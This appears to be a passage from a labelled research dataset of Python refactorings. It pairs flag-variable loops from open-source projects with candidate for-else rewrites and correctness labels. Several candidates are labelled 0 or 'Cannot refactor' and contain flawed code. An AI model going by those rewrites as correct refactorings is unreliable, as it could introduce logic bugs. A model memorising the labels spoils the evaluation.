    if any(((e['time_rastered'] < o['time_end_today_rastered'] or o['time_end_today_rastered'] == midnight) and (o['time_rastered'] < e['time_end_today_rastered'] or e['time_end_today_rastered'] == midnight) for o in row)):
        continue
    row.append(e)
    placed_in_row = True
    break
if not placed_in_row:
    rows_by_collection[collection].append([e])","break statement is executed:None
break statement is not executed:zejun1"
ansible-modules-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-core/utilities/helper/_accelerate.py,https://github.com/ansible/ansible-modules-core/tree/master/utilities/helper/_accelerate.py,LocalSocketThread,run$213,"def run(self):
        try:
            if os.path.exists(SOCKET_FILE):
                os.remove(SOCKET_FILE)
            else:
                dir = os.path.dirname(SOCKET_FILE)
                if os.path.exists(dir):
                    if not os.path.isdir(dir):
                        log(""The socket file path (%s) exists, but is not a directory. No local connections will be available"" % dir)
                        return
                    else:
                        # make sure the directory is accessible only to this
                        # user, as socket files derive their permissions from
                        # the directory that contains them
                        os.chmod(dir, int('0700', 8))
                elif not os.path.exists(dir):
                    os.makedirs(dir, int('O700', 8))
        except OSError:
            pass
        self.s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.s.bind(SOCKET_FILE)
        self.s.listen(5)
        while not self.terminated:
            try:
                conn, addr = self.s.accept()
                vv(""received local connection"")
                data = """"
                while ""\n"" not in data:
                    data += conn.recv(2048)
                try:
                    try:
                        new_key = AesKey.Read(data.strip())
                        found = False
                        for key in self.server.key_list:
                            try:
                                new_key.Decrypt(key.Encrypt(""foo""))
                                found = True
                                break
                            except:
                                pass
                        if not found:
                            vv(""adding new key to the key list"")
                            self.server.key_list.append(new_key)
                            conn.sendall(""OK\n"")
                        else:
                            vv(""key already exists in the key list, ignoring"")
                            conn.sendall(""EXISTS\n"")

                        # update the last event time so the server doesn't
                        # shutdown sooner than expected for new clients
                        try:
                            self.server.last_event_lock.acquire()
                            self.server.last_event = datetime.datetime.now()
                        finally:
                            self.server.last_event_lock.release()
                    except Exception:
                        e = get_exception()
                        vv(""key loaded locally was invalid, ignoring (%s)"" % e)
                        conn.sendall(""BADKEY\n"")
                finally:
                    try:
                        conn.close()
                    except:
                        pass
            except:
                pass","for key in self.server.key_list:
    try:
        new_key.Decrypt(key.Encrypt('foo'))
        found = True
        break
    except:
        pass
if not found:
    vv('adding new key to the key list')
    self.server.key_list.append(new_key)
    conn.sendall('OK\n')
else:
    vv('key already exists in the key list, ignoring')
    conn.sendall('EXISTS\n')","for key in self.server.key_list:
    try:
        new_key.Decrypt(key.Encrypt('foo'))
        vv('key already exists in the key list, ignoring')
        conn.sendall('EXISTS\n')
        break
    except:
        pass
else:
    vv('adding new key to the key list')
    self.server.key_list.append(new_key)
    conn.sendall('OK\n')","for key in self.server.key_list:
    try:
        new_key.Decrypt(key.Encrypt('foo'))
        vv('key already exists in the key list, ignoring')
        conn.sendall('EXISTS\n')
        break
    except:
        pass
else:
    vv('adding new key to the key list')
    self.server.key_list.append(new_key)
    conn.sendall('OK\n')",1,"for key in self.server.key_list:
    try:
        new_key.Decrypt(key.Encrypt('foo'))
        found = True
        break
    except:
        pass
if not found:
    vv('adding new key to the key list')
    self.server.key_list.append(new_key)
    conn.sendall('OK\n')
else:
    vv('key already exists in the key list, ignoring')
    conn.sendall('EXISTS\n')","break statement is executed:None
break statement is not executed:zejun1"
bpy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bpy/space_view3d_point_cloud_visualizer.py,https://github.com/uhlik/bpy/tree/master//space_view3d_point_cloud_visualizer.py,PCVParticleSystemSampler,__init__$5046,"def __init__(self, context, o, alive_only=True, colorize=None, constant_color=None, vcols=None, uvtex=None, vgroup=None, ):
        log(""{}:"".format(self.__class__.__name__), 0)
        
        def remap(v, min1, max1, min2, max2, ):
            def clamp(v, vmin, vmax):
                if(vmax <= vmin):
                    raise ValueError(""Maximum value is smaller than or equal to minimum."")
                if(v <= vmin):
                    return vmin
                if(v >= vmax):
                    return vmax
                return v
            
            def normalize(v, vmin, vmax):
                return (v - vmin) / (vmax - vmin)
            
            def interpolate(nv, vmin, vmax):
                return vmin + (vmax - vmin) * nv
            
            if(max1 - min1 == 0):
                # handle zero division when min1 = max1
                return min2
            
            r = interpolate(normalize(v, min1, max1), min2, max2)
            return r
        
        vs = []
        ns = []
        cs = []
        
        depsgraph = context.evaluated_depsgraph_get()
        if(o.modifiers):
            owner = o.evaluated_get(depsgraph)
            me = owner.to_mesh(preserve_all_data_layers=True, depsgraph=depsgraph, )
        else:
            owner = o
            me = owner.to_mesh(preserve_all_data_layers=True, depsgraph=depsgraph, )
        
        o = owner
        
        bm = bmesh.new()
        bm.from_mesh(me)
        bm.verts.ensure_lookup_table()
        bm.faces.ensure_lookup_table()
        
        psys = o.particle_systems.active
        if(psys is None):
            raise Exception(""Cannot find active particle system"")
        if(len(psys.particles) == 0):
            raise Exception(""Active particle system has 0 particles"")
        if(alive_only):
            ok = False
            for p in psys.particles:
                if(p.alive_state == ""ALIVE""):
                    ok = True
                    break
            if(not ok):
                raise Exception(""Active particle system has 0 alive particles"")
        
        mod = None
        uv_no = None
        if(colorize in ('VCOLS', 'UVTEX', 'GROUP_MONO', 'GROUP_COLOR', )):
            if(uvtex is None):
                raise Exception(""Cannot find active uv layout on emitter"")
            for m in o.modifiers:
                if(m.type == 'PARTICLE_SYSTEM'):
                    if(m.particle_system == psys):
                        mod = m
                        break
            uv_no = o.data.uv_layers.active_index
        
        if(colorize == 'UVTEX'):
            try:
                if(o.active_material is None):
                    raise Exception(""Cannot find active material"")
                uvtexnode = o.active_material.node_tree.nodes.active
                if(uvtexnode is None):
                    raise Exception(""Cannot find active image texture in active material"")
                uvimage = uvtexnode.image
                if(uvimage is None):
                    raise Exception(""Cannot find active image texture with loaded image in active material"")
                uvimage.update()
                uvarray = np.asarray(uvimage.pixels)
                uvarray = uvarray.reshape((uvimage.size[1], uvimage.size[0], 4))
                uvlayer = bm.loops.layers.uv.active
                if(uvlayer is None):
                    raise Exception(""Cannot find active UV layout"")
            except Exception as e:
                raise Exception(str(e))
        if(colorize == 'VCOLS'):
            try:
                col_layer = bm.loops.layers.color.active
                if(col_layer is None):
                    raise Exception()
            except Exception:
                raise Exception(""Cannot find active vertex colors"")
            # for vertex groups, uv layout is required.. non-overlapping for best results
            uvlayer = bm.loops.layers.uv.active
            if(uvlayer is None):
                raise Exception(""Cannot find active UV layout"")
        if(colorize in ('GROUP_MONO', 'GROUP_COLOR')):
            try:
                group_layer = bm.verts.layers.deform.active
                if(group_layer is None):
                    raise Exception()
                group_layer_index = o.vertex_groups.active.index
            except Exception:
                raise Exception(""Cannot find active vertex group"")
            # for vertex groups, uv layout is required.. non-overlapping for best results
            uvlayer = bm.loops.layers.uv.active
            if(uvlayer is None):
                raise Exception(""Cannot find active UV layout"")
        
        # flatten mesh by uv and add original face indexes as int layer
        def simple_flatten_uv_mesh(bm):
            bm.faces.index_update()
            bm.faces.ensure_lookup_table()
            r = bmesh.new()
            ilayer = r.faces.layers.int.new('face_indexes')
            for f in bm.faces:
                fvs = []
                for i, l in enumerate(f.loops):
                    uv = l[uvlayer].uv
                    rv = r.verts.new((uv.x, uv.y, 0.0))
                    fvs.append(rv)
                rf = r.faces.new(fvs)
                rf[ilayer] = f.index
            r.faces.index_update()
            r.faces.ensure_lookup_table()
            return r
        
        if(colorize in ('VCOLS', 'GROUP_MONO', 'GROUP_COLOR', )):
            # i do not need extra flat mesh each time..
            bmf = simple_flatten_uv_mesh(bm)
            bmf_il = bmf.faces.layers.int['face_indexes']
            # with that i can ray_cast uv location and get original index of face i hit
            bmf_bvh = BVHTree.FromBMesh(bmf)
        
        for i, p in enumerate(psys.particles):
            if(p.alive_state != ""ALIVE"" and alive_only):
                continue
            
            vs.append(p.location.to_tuple())
            
            n = Vector((1.0, 0.0, 0.0, ))
            n.rotate(p.rotation)
            ns.append(n.normalized().to_tuple())
            
            if(colorize is None):
                cs.append((1.0, 0.0, 0.0, ))
            elif(colorize == 'CONSTANT'):
                cs.append(constant_color)
            elif(colorize == 'VCOLS'):
                uv = p.uv_on_emitter(mod)
                # intersect with flattened mesh and get original index of face from emitter mesh
                fl, fn, fi, di = bmf_bvh.ray_cast(Vector((uv.x, uv.y, -0.1)), Vector((0.0, 0.0, 1.0)), 0.2, )
                fpoly = bmf.faces[fi]
                oi = fpoly[bmf_il]
                poly = bm.faces[oi]
                # get final color from barycentric weights
                ws = poly_3d_calc([fv.co for fv in fpoly.verts], p.location)
                cols = [l[col_layer][:3] for l in poly.loops]
                r = sum([cc[0] * ws[ci] for ci, cc in enumerate(cols)])
                g = sum([cc[1] * ws[ci] for ci, cc in enumerate(cols)])
                b = sum([cc[2] * ws[ci] for ci, cc in enumerate(cols)])
                cs.append((r, g, b, ))
            elif(colorize == 'UVTEX'):
                uv = p.uv_on_emitter(mod)
                w, h = uvimage.size
                # x,y % 1.0 to wrap around if uv coordinate is outside 0.0-1.0 range
                x = int(round(remap(uv.x % 1.0, 0.0, 1.0, 0, w - 1)))
                y = int(round(remap(uv.y % 1.0, 0.0, 1.0, 0, h - 1)))
                cs.append(tuple(uvarray[y][x][:3].tolist()))
            elif(colorize == 'GROUP_MONO'):
                uv = p.uv_on_emitter(mod)
                fl, fn, fi, di = bmf_bvh.ray_cast(Vector((uv.x, uv.y, -0.1)), Vector((0.0, 0.0, 1.0)), 0.2, )
                fpoly = bmf.faces[fi]
                oi = fpoly[bmf_il]
                poly = bm.faces[oi]
                ws = poly_3d_calc([fv.co for fv in fpoly.verts], p.location)
                weights = [pv[group_layer].get(group_layer_index, 0.0) for pv in poly.verts]
                w = sum([ww * ws[wi] for wi, ww in enumerate(weights)])
                cs.append((w, w, w, ))
            elif(colorize == 'GROUP_COLOR'):
                uv = p.uv_on_emitter(mod)
                fl, fn, fi, di = bmf_bvh.ray_cast(Vector((uv.x, uv.y, -0.1)), Vector((0.0, 0.0, 1.0)), 0.2, )
                fpoly = bmf.faces[fi]
                oi = fpoly[bmf_il]
                poly = bm.faces[oi]
                ws = poly_3d_calc([fv.co for fv in fpoly.verts], p.location)
                weights = [pv[group_layer].get(group_layer_index, 0.0) for pv in poly.verts]
                w = sum([ww * ws[wi] for wi, ww in enumerate(weights)])
                hue = remap(1.0 - w, 0.0, 1.0, 0.0, 1 / 1.5)
                c = Color()
                c.hsv = (hue, 1.0, 1.0, )
                cs.append((c.r, c.g, c.b, ))
        
        a = np.concatenate((vs, ns, cs), axis=1, )
        np.random.shuffle(a)
        vs = a[:, :3]
        ns = a[:, 3:6]
        cs = a[:, 6:]
        
        self.vs = vs[:]
        self.ns = ns[:]
        self.cs = cs[:]
        
        if(colorize in ('VCOLS', 'GROUP_MONO', 'GROUP_COLOR', )):
            bmf.free()
        
        bm.free()
        owner.to_mesh_clear()","for p in psys.particles:
    if p.alive_state == 'ALIVE':
        ok = True
        break
if not ok:
    raise Exception('Active particle system has 0 alive particles')","for p in psys.particles:
    if p.alive_state == 'ALIVE':
        break
else:
    raise Exception('Active particle system has 0 alive particles')","for p in psys.particles:
    if p.alive_state == 'ALIVE':
        break
else:
    raise Exception('Active particle system has 0 alive particles')",1,"for p in psys.particles:
    if p.alive_state == 'ALIVE':
        ok = True
        break
if not ok:
    raise Exception('Active particle system has 0 alive particles')","break statement is executed:None
break statement is not executed:zejun1"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/prophetnet/tokenization_prophetnet.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/prophetnet/tokenization_prophetnet.py,WordpieceTokenizer,tokenize$215,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/prophetnet/tokenization_prophetnet.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/prophetnet/tokenization_prophetnet.py,WordpieceTokenizer,tokenize$215,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
galaxy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/galaxy/lib/galaxy_test/api/test_jobs.py,https://github.com/ansible/galaxy/tree/master/lib/galaxy_test/api/test_jobs.py,JobsApiTestCase,test_index_state_filter$61,"def test_index_state_filter(self, history_id):
        # Initial number of ok jobs
        original_count = len(self.__uploads_with_state(""ok""))
        # Run through dataset upload to ensure num uplaods at least greater
        # by 1.
        self.__history_with_ok_dataset(history_id)

        # Verify number of ok jobs is actually greater.
        count_increased = False
        for _ in range(10):
            new_count = len(self.__uploads_with_state(""ok""))
            if original_count < new_count:
                count_increased = True
                break
            time.sleep(.1)

        if not count_increased:
            template = ""Jobs in ok state did not increase (was %d, now %d)""
            message = template % (original_count, new_count)
            raise AssertionError(message)","for _ in range(10):
    new_count = len(self.__uploads_with_state('ok'))
    if original_count < new_count:
        count_increased = True
        break
    time.sleep(0.1)
if not count_increased:
    template = 'Jobs in ok state did not increase (was %d, now %d)'
    message = template % (original_count, new_count)
    raise AssertionError(message)","for _ in range(10):
    new_count = len(self.__uploads_with_state('ok'))
    if original_count < new_count:
        break
    time.sleep(0.1)
else:
    template = 'Jobs in ok state did not increase (was %d, now %d)'
    message = template % (original_count, new_count)
    raise AssertionError(message)","for _ in range(10):
    new_count = len(self.__uploads_with_state('ok'))
    if original_count < new_count:
        break
    time.sleep(0.1)
else:
    template = 'Jobs in ok state did not increase (was %d, now %d)'
    message = template % (original_count, new_count)
    raise AssertionError(message)",1,"for _ in range(10):
    new_count = len(self.__uploads_with_state('ok'))
    if original_count < new_count:
        count_increased = True
        break
    time.sleep(0.1)
if not count_increased:
    template = 'Jobs in ok state did not increase (was %d, now %d)'
    message = template % (original_count, new_count)
    raise AssertionError(message)","break statement is executed:None
break statement is not executed:zejun1"
kivy-designer,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/kivy-designer/designer/components/playground.py,https://github.com/kivy/kivy-designer/tree/master/designer/components/playground.py,PlaygroundDragElement,_show_lines_on_child$119,"def _show_lines_on_child(self, *args):
        '''To show boundaries around the child.
        '''
        x, y = self.child.pos
        right, top = self.child.right, self.child.top
        points = [x, y, right, y, right, top, x, top]
        if hasattr(self, '_canvas_instr'):
            points_equal = True
            for i in range(len(points)):
                if points[i] != self._canvas_instr[1].points[i]:
                    points_equal = False
                    break

            if points_equal:
                return

        self.remove_lines_on_child()
        with self.child.canvas.after:
            color = Color(1, 0.5, 0.8)
            line = Line(points=points, close=True, width=2.)

        self._canvas_instr = [color, line]","for i in range(len(points)):
    if points[i] != self._canvas_instr[1].points[i]:
        points_equal = False
        break
if points_equal:
    return","for i in range(len(points)):
    if points[i] != self._canvas_instr[1].points[i]:
        break
else:
    return","for i in range(len(points)):
    if points[i] != self._canvas_instr[1].points[i]:
        break
else:
    return",1,"for i in range(len(points)):
    if points[i] != self._canvas_instr[1].points[i]:
        points_equal = False
        break
if points_equal:
    return","break statement is executed:None
break statement is not executed:zejun1"
BlenderProc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/BlenderProc/blenderproc/python/modules/provider/getter/Texture.py,https://github.com/DLR-RM/BlenderProc/tree/master/blenderproc/python/modules/provider/getter/Texture.py,Texture,perform_and_condition_check$139,"def perform_and_condition_check(and_condition, textures, used_textures_to_check=None):
        """""" Checks for all textures and if all given conditions are true, collects them in the return list.

        :param and_condition: Given conditions. Type: dict.
        :param textures: Textures, that are already in the return list. Type: list.
        :param used_textures_to_check: Textures to perform the check on. Type: list. Default: all materials
        :return: Textures that comply with given conditions. Type: list.
        """"""
        new_textures = []
        if used_textures_to_check is None:
            used_textures_to_check = get_all_textures()

        for texture in used_textures_to_check:
            if texture in new_textures or texture in textures:
                continue

            select_texture = True
            for key, value in and_condition.items():
                # check if the key is a requested custom property
                requested_custom_property = False
                #requested_custom_function = False
                if key.startswith('cp_'):
                    requested_custom_property = True
                    key = key[3:]
                if key.startswith('cf_'):
                    #requested_custom_function = True
                    #key = key[3:]
                    raise RuntimeError(""Custom functions for texture objects are yet to be implemented!"")
                if hasattr(texture, key) and not requested_custom_property:
                    # check if the type of the value of attribute matches desired
                    if isinstance(getattr(texture, key), type(value)):
                        new_value = value
                    # if not, try to enforce some mathutils-specific type
                    else:
                        if isinstance(getattr(texture, key), mathutils.Vector):
                            new_value = mathutils.Vector(value)
                        elif isinstance(getattr(texture, key), mathutils.Euler):
                            new_value = mathutils.Euler(value)
                        elif isinstance(getattr(texture, key), mathutils.Color):
                            new_value = mathutils.Color(value)
                        # raise an exception if it is none of them
                        else:
                            raise Exception(""Types are not matching: %s and %s !""
                                            % (type(getattr(texture, key)), type(value)))
                    # or check for equality
                    if not ((isinstance(getattr(texture, key), str) and
                             re.fullmatch(value, getattr(texture, key)) is not None)
                            or getattr(texture, key) == new_value):
                        select_texture = False
                        break
                    # check if a custom property with this name exists
                elif key in texture and requested_custom_property:
                    # check if the type of the value of such custom property matches desired
                    if isinstance(texture[key], type(value)) or (
                            isinstance(texture[key], int) and isinstance(value, bool)):
                        # if it is a string and if the whole string matches the given pattern
                        if not ((isinstance(texture[key], str) and re.fullmatch(value, texture[key]) is not None) or
                                texture[key] == value):
                            select_texture = False
                            break
                    else:
                        # raise an exception if not
                        raise Exception(""Types are not matching: {} and {} !"".format(type(texture[key]), type(value)))
                else:
                    select_texture = False
                    break

            if select_texture:
                new_textures.append(texture)

        return new_textures","for (key, value) in and_condition.items():
    requested_custom_property = False
    if key.startswith('cp_'):
        requested_custom_property = True
        key = key[3:]
    if key.startswith('cf_'):
        raise RuntimeError('Custom functions for texture objects are yet to be implemented!')
    if hasattr(texture, key) and (not requested_custom_property):
        if isinstance(getattr(texture, key), type(value)):
            new_value = value
        elif isinstance(getattr(texture, key), mathutils.Vector):
            new_value = mathutils.Vector(value)
        elif isinstance(getattr(texture, key), mathutils.Euler):
            new_value = mathutils.Euler(value)
        elif isinstance(getattr(texture, key), mathutils.Color):
            new_value = mathutils.Color(value)
        else:
            raise Exception('Types are not matching: %s and %s !' % (type(getattr(texture, key)), type(value)))
        if not (isinstance(getattr(texture, key), str) and re.fullmatch(value, getattr(texture, key)) is not None or getattr(texture, key) == new_value):
            select_texture = False
            break
    elif key in texture and requested_custom_property:
        if isinstance(texture[key], type(value)) or (isinstance(texture[key], int) and isinstance(value, bool)):
            if not (isinstance(texture[key], str) and re.fullmatch(value, texture[key]) is not None or texture[key] == value):
                select_texture = False
                break
        else:
            raise Exception('Types are not matching: {} and {} !'.format(type(texture[key]), type(value)))
    else:
        select_texture = False
        break
if select_texture:
    new_textures.append(texture)","for (key, value) in and_condition.items():
    requested_custom_property = False
    if key.startswith('cp_'):
        requested_custom_property = True
        key = key[3:]
    if key.startswith('cf_'):
        raise RuntimeError('Custom functions for texture objects are yet to be implemented!')
    if hasattr(texture, key) and (not requested_custom_property):
        if isinstance(getattr(texture, key), type(value)):
            new_value = value
        elif isinstance(getattr(texture, key), mathutils.Vector):
            new_value = mathutils.Vector(value)
        elif isinstance(getattr(texture, key), mathutils.Euler):
            new_value = mathutils.Euler(value)
        elif isinstance(getattr(texture, key), mathutils.Color):
            new_value = mathutils.Color(value)
        else:
            raise Exception('Types are not matching: %s and %s !' % (type(getattr(texture, key)), type(value)))
        if not (isinstance(getattr(texture, key), str) and re.fullmatch(value, getattr(texture, key)) is not None or getattr(texture, key) == new_value):
            break
    elif key in texture and requested_custom_property:
        if isinstance(texture[key], type(value)) or (isinstance(texture[key], int) and isinstance(value, bool)):
            if not (isinstance(texture[key], str) and re.fullmatch(value, texture[key]) is not None or texture[key] == value):
                break
        else:
            raise Exception('Types are not matching: {} and {} !'.format(type(texture[key]), type(value)))
    else:
        select_texture = False
        break
else:
    new_textures.append(texture)","for (key, value) in and_condition.items():
    requested_custom_property = False
    if key.startswith('cp_'):
        requested_custom_property = True
        key = key[3:]
    if key.startswith('cf_'):
        raise RuntimeError('Custom functions for texture objects are yet to be implemented!')
    if hasattr(texture, key) and (not requested_custom_property):
        if isinstance(getattr(texture, key), type(value)):
            new_value = value
        elif isinstance(getattr(texture, key), mathutils.Vector):
            new_value = mathutils.Vector(value)
        elif isinstance(getattr(texture, key), mathutils.Euler):
            new_value = mathutils.Euler(value)
        elif isinstance(getattr(texture, key), mathutils.Color):
            new_value = mathutils.Color(value)
        else:
            raise Exception('Types are not matching: %s and %s !' % (type(getattr(texture, key)), type(value)))
        if not (isinstance(getattr(texture, key), str) and re.fullmatch(value, getattr(texture, key)) is not None or getattr(texture, key) == new_value):
            break
    elif key in texture and requested_custom_property:
        if isinstance(texture[key], type(value)) or (isinstance(texture[key], int) and isinstance(value, bool)):
            if not (isinstance(texture[key], str) and re.fullmatch(value, texture[key]) is not None or texture[key] == value):
                break
        else:
            raise Exception('Types are not matching: {} and {} !'.format(type(texture[key]), type(value)))
    else:
        break
else:
    new_textures.append(texture)",0,"for (key, value) in and_condition.items():
    requested_custom_property = False
    if key.startswith('cp_'):
        requested_custom_property = True
        key = key[3:]
    if key.startswith('cf_'):
        raise RuntimeError('Custom functions for texture objects are yet to be implemented!')
    if hasattr(texture, key) and (not requested_custom_property):
        if isinstance(getattr(texture, key), type(value)):
            new_value = value
        elif isinstance(getattr(texture, key), mathutils.Vector):
            new_value = mathutils.Vector(value)
        elif isinstance(getattr(texture, key), mathutils.Euler):
            new_value = mathutils.Euler(value)
        elif isinstance(getattr(texture, key), mathutils.Color):
            new_value = mathutils.Color(value)
        else:
            raise Exception('Types are not matching: %s and %s !' % (type(getattr(texture, key)), type(value)))
        if not (isinstance(getattr(texture, key), str) and re.fullmatch(value, getattr(texture, key)) is not None or getattr(texture, key) == new_value):
            select_texture = False
            break
    elif key in texture and requested_custom_property:
        if isinstance(texture[key], type(value)) or (isinstance(texture[key], int) and isinstance(value, bool)):
            if not (isinstance(texture[key], str) and re.fullmatch(value, texture[key]) is not None or texture[key] == value):
                select_texture = False
                break
        else:
            raise Exception('Types are not matching: {} and {} !'.format(type(texture[key]), type(value)))
    else:
        select_texture = False
        break
if select_texture:
    new_textures.append(texture)","break statement is executed:None
break statement is not executed:zejun1"
EfficientDet.Pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/EfficientDet.Pytorch/utils/visualization.py,https://github.com/toandaominh1997/EfficientDet.Pytorch/tree/master/utils/visualization.py,TensorboardWriter,__init__$6,"def __init__(self, log_dir, enabled):
        self.writer = None
        self.selected_module = """"

        if enabled:
            log_dir = str(log_dir)

            # Retrieve vizualization writer.
            succeeded = False
            for module in [""torch.utils.tensorboard"", ""tensorboardX""]:
                try:
                    self.writer = importlib.import_module(
                        module).SummaryWriter(log_dir)
                    succeeded = True
                    break
                except ImportError:
                    succeeded = False
                self.selected_module = module

            if not succeeded:
                message = ""Warning: visualization (Tensorboard) is configured to use, but currently not installed on "" \
                    ""this machine. Please install TensorboardX with 'pip install tensorboardx', upgrade PyTorch to "" \
                    ""version >= 1.1 to use 'torch.utils.tensorboard' or turn off the option in the 'config.json' file.""
                print(message)

        self.step = 0
        self.mode = ''

        self.tb_writer_ftns = {
            'add_scalar', 'add_scalars', 'add_image', 'add_images', 'add_audio',
            'add_text', 'add_histogram', 'add_pr_curve', 'add_embedding', 'add_graph'
        }
        self.tag_mode_exceptions = {'add_histogram', 'add_embedding'}
        self.timer = datetime.now()","for module in ['torch.utils.tensorboard', 'tensorboardX']:
    try:
        self.writer = importlib.import_module(module).SummaryWriter(log_dir)
        succeeded = True
        break
    except ImportError:
        succeeded = False
    self.selected_module = module
if not succeeded:
    message = ""Warning: visualization (Tensorboard) is configured to use, but currently not installed on this machine. Please install TensorboardX with 'pip install tensorboardx', upgrade PyTorch to version >= 1.1 to use 'torch.utils.tensorboard' or turn off the option in the 'config.json' file.""
    print(message)","for module in ['torch.utils.tensorboard', 'tensorboardX']:
    try:
        self.writer = importlib.import_module(module).SummaryWriter(log_dir)
        break
    except ImportError:
        succeeded = False
    self.selected_module = module
else:
    message = ""Warning: visualization (Tensorboard) is configured to use, but currently not installed on this machine. Please install TensorboardX with 'pip install tensorboardx', upgrade PyTorch to version >= 1.1 to use 'torch.utils.tensorboard' or turn off the option in the 'config.json' file.""
    print(message)","for module in ['torch.utils.tensorboard', 'tensorboardX']:
    try:
        self.writer = importlib.import_module(module).SummaryWriter(log_dir)
        succeeded = True
        break
    except ImportError:
        succeeded = False
    self.selected_module = module
else:
    message = ""Warning: visualization (Tensorboard) is configured to use, but currently not installed on this machine. Please install TensorboardX with 'pip install tensorboardx', upgrade PyTorch to version >= 1.1 to use 'torch.utils.tensorboard' or turn off the option in the 'config.json' file.""
    print(message)",0,"for module in ['torch.utils.tensorboard', 'tensorboardX']:
    try:
        self.writer = importlib.import_module(module).SummaryWriter(log_dir)
        succeeded = True
        break
    except ImportError:
        succeeded = False
    self.selected_module = module
if not succeeded:
    message = ""Warning: visualization (Tensorboard) is configured to use, but currently not installed on this machine. Please install TensorboardX with 'pip install tensorboardx', upgrade PyTorch to version >= 1.1 to use 'torch.utils.tensorboard' or turn off the option in the 'config.json' file.""
    print(message)","break statement is executed:None
break statement is not executed:zejun1"
docassemble,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/docassemble/docassemble_base/docassemble/base/parse.py,https://github.com/jhpyle/docassemble/tree/master/docassemble_base/docassemble/base/parse.py,Question,ask$4947,"def ask(self, user_dict, old_user_dict, the_x, iterators, sought, orig_sought, process_list_collect=True, test_for_objects=True):
        #logmessage(""ask: orig_sought is "" + str(orig_sought) + "" and q is "" + self.name)
        docassemble.base.functions.this_thread.current_question = self
        if the_x != 'None':
            exec(""x = "" + the_x, user_dict)
        if len(iterators):
            for indexno in range(len(iterators)):
                #logmessage(""Running "" + list_of_indices[indexno] + "" = "" + iterators[indexno])
